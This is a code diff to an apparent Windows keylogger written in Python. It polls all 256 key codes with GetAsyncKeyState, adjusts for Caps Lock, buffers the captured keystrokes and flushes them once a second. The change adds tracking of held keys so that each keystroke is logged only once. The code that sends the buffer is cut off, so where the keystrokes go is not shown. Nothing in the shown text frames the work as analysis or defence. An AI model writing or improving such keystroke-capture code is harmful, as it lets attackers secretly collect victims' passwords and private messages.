@@ -54,15 +54,23 @@ def getKey(code):
 def main():
     buffer = []
     last_sent = time.time()
+    pressed_keys = set()
 
     while True:
         for i in range(256):
-            if user32.GetAsyncKeyState(i) & 0x8000:
-                key = getKey(str(i))
-                if user32.GetKeyState(0x14) & 0x0001 == 0:
-                    key = key.lower()
-                if key:
-                    buffer.append(key)
+            key_state = user32.GetAsyncKeyState(i)
+
+            if key_state & 0x8000:
+                if i not in pressed_keys:
+                    key = getKey(str(i))
+                    if user32.GetKeyState(0x14) & 0x0001 == 0:
+                        key = key.lower()
+                    if key:
+                        buffer.append(key)
+                    pressed_keys.add(i)
+            else:
+                if i in pressed_keys:
+                    pressed_keys.remove(i)
 
         if time.time() - last_sent >= 1.0:
             if buffer:
